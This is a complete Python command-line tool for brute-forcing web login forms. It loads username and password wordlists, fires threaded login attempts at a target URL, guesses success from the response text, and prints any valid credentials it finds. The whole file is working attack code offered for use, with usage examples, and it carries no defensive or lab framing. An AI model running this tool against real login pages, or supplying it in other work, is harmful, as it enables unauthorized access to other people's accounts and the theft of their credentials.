#!/usr/bin/env python3
"""
Web Login Bruteforce Tool
A tool for brute forcing web login forms
"""

import requests
import argparse
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin

class WebLoginBruteforcer:
    def __init__(self, url, username_field, password_field,
                 error_message=None, success_message=None,
                 method='POST', delay=0, verbose=False):
        self.url = url
        self.username_field = username_field
        self.password_field = password_field
        self.error_message = error_message
        self.success_message = success_message
        self.method = method.upper()
        self.delay = delay
        self.verbose = verbose
        self.session = requests.Session()
        self.attempts = 0
        self.found = False

    def try_login(self, username, password):
        """Attempt to login with given credentials"""
        if self.found:
            return None

        self.attempts += 1

        try:
            # Prepare login data
            data = {
                self.username_field: username,
                self.password_field: password
            }

            # Add delay if specified
            if self.delay > 0:
                time.sleep(self.delay)

            # Attempt login
            if self.method == 'POST':
                response = self.session.post(self.url, data=data, allow_redirects=True)
            else:
                response = self.session.get(self.url, params=data, allow_redirects=True)

            # Check response
            response_text = response.text.lower()

            # Success detection
            if self.success_message:
                if self.success_message.lower() in response_text:
                    return True

            # Error detection (if no success message specified)
            if self.error_message:
                if self.error_message.lower() not in response_text:
                    return True
            else:
                # Default heuristics
                error_indicators = [
                    'incorrect', 'invalid', 'failed', 'wrong',
                    'error', 'denied', 'unauthorized'
                ]
                if not any(indicator in response_text for indicator in error_indicators):
                    # Might be successful if no error indicators found
                    if response.status_code == 200:
                        return True

            return False

        except requests.exceptions.RequestException as e:
            if self.verbose:
                print(f"[-] Error: {e}")
            return False

    def bruteforce_single_user(self, username, password_list):
        """Brute force for a single username"""
        print(f"\n[*] Starting bruteforce for username: {username}")
        print(f"[*] Testing {len(password_list)} passwords...")
        print("-" * 60)

        for i, password in enumerate(password_list, 1):
            if self.found:
                break

            if self.verbose:
                print(f"[{i}/{len(password_list)}] Trying: {username}:{password}")

            result = self.try_login(username, password)

            if result:
                self.found = True
                print(f"\n[+] SUCCESS! Valid credentials found:")
                print(f"[+] Username: {username}")
                print(f"[+] Password: {password}")
                print(f"[+] Attempts: {self.attempts}")
                return (username, password)

        return None

    def bruteforce_multiple_users(self, username_list, password_list, threads=5):
        """Brute force for multiple usernames"""
        print(f"\n[*] Starting bruteforce attack")
        print(f"[*] Target: {self.url}")
        print(f"[*] Method: {self.method}")
        print(f"[*] Usernames: {len(username_list)}")
        print(f"[*] Passwords: {len(password_list)}")
        print(f"[*] Threads: {threads}")
        print("-" * 60)

        found_creds = []

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {}

            for username in username_list:
                for password in password_list:
                    if self.found:
                        break
                    future = executor.submit(self.try_login, username, password)
                    futures[future] = (username, password)

            for future in as_completed(futures):
                if self.found:
                    break

                username, password = futures[future]
                result = future.result()

                if self.verbose:
                    print(f"[*] Trying: {username}:{password}")

                if result:
                    self.found = True
                    print(f"\n[+] SUCCESS! Valid credentials found:")
                    print(f"[+] Username: {username}")
                    print(f"[+] Password: {password}")
                    print(f"[+] Attempts: {self.attempts}")
                    found_creds.append((username, password))

        return found_creds

def load_wordlist(filename):
    """Load wordlist from file"""
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"Error: File '{filename}' not found")
        sys.exit(1)
    except Exception as e:
        print(f"Error reading file: {e}")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(
        description='Web Login Bruteforce Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  Single username:
    %(prog)s -u admin -P passwords.txt -l http://example.com/login

  Multiple usernames:
    %(prog)s -U users.txt -P passwords.txt -l http://example.com/login

  Custom form fields:
    %(prog)s -u admin -P pass.txt -l http://site.com/login \\
      --username-field user --password-field pass

  With error message detection:
    %(prog)s -u admin -P pass.txt -l http://site.com/login \\
      -e "Invalid credentials"

  With success message detection:
    %(prog)s -u admin -P pass.txt -l http://site.com/login \\
      -s "Welcome"
        '''
    )

    parser.add_argument('-l', '--login-url', required=True, help='Login page URL')
    parser.add_argument('-u', '--username', help='Single username to test')
    parser.add_argument('-U', '--username-list', help='File containing usernames')
    parser.add_argument('-p', '--password', help='Single password to test')
    parser.add_argument('-P', '--password-list', help='File containing passwords')

    parser.add_argument('--username-field', default='username',
                        help='Username field name (default: username)')
    parser.add_argument('--password-field', default='password',
                        help='Password field name (default: password)')

    parser.add_argument('-m', '--method', default='POST', choices=['POST', 'GET'],
                        help='HTTP method (default: POST)')

    parser.add_argument('-e', '--error-message',
                        help='Error message indicating failed login')
    parser.add_argument('-s', '--success-message',
                        help='Success message indicating successful login')

    parser.add_argument('-t', '--threads', type=int, default=5,
                        help='Number of threads (default: 5)')
    parser.add_argument('-d', '--delay', type=float, default=0,
                        help='Delay between requests in seconds (default: 0)')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Verbose output')

    args = parser.parse_args()

    # Validate arguments
    if not args.username and not args.username_list:
        parser.error("Either -u/--username or -U/--username-list is required")

    if not args.password and not args.password_list:
        parser.error("Either -p/--password or -P/--password-list is required")

    # Load usernames
    if args.username_list:
        usernames = load_wordlist(args.username_list)
    else:
        usernames = [args.username]

    # Load passwords
    if args.password_list:
        passwords = load_wordlist(args.password_list)
    else:
        passwords = [args.password]

    # Create bruteforcer
    bruteforcer = WebLoginBruteforcer(
        url=args.login_url,
        username_field=args.username_field,
        password_field=args.password_field,
        error_message=args.error_message,
        success_message=args.success_message,
        method=args.method,
        delay=args.delay,
        verbose=args.verbose
    )

    try:
        if len(usernames) == 1:
            # Single username mode
            result = bruteforcer.bruteforce_single_user(usernames[0], passwords)
            if not result:
                print(f"\n[-] No valid credentials found")
                print(f"[-] Total attempts: {bruteforcer.attempts}")
        else:
            # Multiple usernames mode
            results = bruteforcer.bruteforce_multiple_users(usernames, passwords, threads=args.threads)
            if not results:
                print(f"\n[-] No valid credentials found")
                print(f"[-] Total attempts: {bruteforcer.attempts}")

    except KeyboardInterrupt:
        print("\n\n[!] Attack interrupted by user")
        print(f"[!] Attempts made: {bruteforcer.attempts}")
        sys.exit(1)

if __name__ == "__main__":
    main()
